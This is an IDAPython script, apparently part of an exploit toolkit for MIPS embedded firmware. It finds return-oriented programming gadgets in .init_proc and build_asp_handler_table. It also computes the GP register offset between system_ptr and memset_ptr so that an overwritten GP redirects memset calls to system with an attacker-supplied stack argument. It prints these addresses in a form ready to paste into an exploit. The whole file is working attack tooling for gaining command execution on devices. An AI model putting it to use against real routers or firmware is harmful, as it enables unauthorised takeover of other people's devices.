# This IDAPython script finds gadgets in a MIPS executable which can be used to
# modify the GP value, such that memset calls actually call system, and then it
# finds gadget to call system with an argument on the stack.

import sys
import os

import idaapi
import idc

def print_gadget(fd, start, end):
	fd.write("Found gadget (address 0x{:x})\n".format(start))
	for address in range(start, end+4, 4):
		fd.write("0x{:x}: {}\n".format(address, GetDisasm(address)))
	fd.write("\n")

def find_gadget(fd):

	required = {
		#".term_proc" : [
		".init_proc" : [
			["lw      $gp, ", "$sp"],
			["lw      $ra, ", "$sp"],
			["jr      $ra"],
			["addiu   $sp, 0x20"],
		],
		"build_asp_handler_table" : [
			["move    $fp, $sp"],
			["jalr    $t9 ; memset"],
		],
	}

	gadgets = []
	for function_name, gadget_reqs in required.items():
		function_address = LocByName(function_name)
		start, end = next(Chunks(function_address))

		found_insts = {}
		for inst_address in range(start, end, 4):
			disasm = GetDisasm(inst_address)
			for required_inst in gadget_reqs:
				if all([x in disasm for x in required_inst]):
					found_insts[str(required_inst)] = inst_address

			if len(gadget_reqs) == len(found_insts):
				gadget_start = min(found_insts.values())
				print_gadget(fd, gadget_start, max(found_insts.values())+4)
				gadgets.append(gadget_start)
				break

	return gadgets

def get_gp_info(fd):
	function_address = LocByName("build_asp_handler_table")
	start, end = next(Chunks(function_address))

	for inst_address in range(start, end, 4):
		disasm = GetDisasm(inst_address)
		if disasm.startswith('li      $gp, '):
			gp = function_address + GetOperandValue(inst_address, 1)
			break
		elif disasm.startswith('la      $gp, '):
			gp = GetOperandValue(inst_address, 1)
			break

	fd.write("GP value = 0x{:x}\n".format(gp))
	gp_diff = LocByName("system_ptr") - LocByName("memset_ptr")
	fd.write("GP diff = 0x{:x}\n".format(gp_diff))
	return [gp, gp_diff]

idaapi.autoWait()

# Detect if we're in batch mode and want to write to a file
input_file = os.environ.get("OUTPUT_GADGET_NAME")
fd = sys.stdout
if input_file != None:
	fd = open(input_file, 'w')

gadgets = find_gadget(fd)
gp_info = get_gp_info(fd)

fd.write("[0x{:x}+0x{:x}, 0x{:x}, 0x{:x}],\n".format(gp_info[0], gp_info[1], gadgets[0], gadgets[1]))

# if we're in batch mode, close the file and exit
if input_file != None:
	fd.close()
	idc.Exit(0)

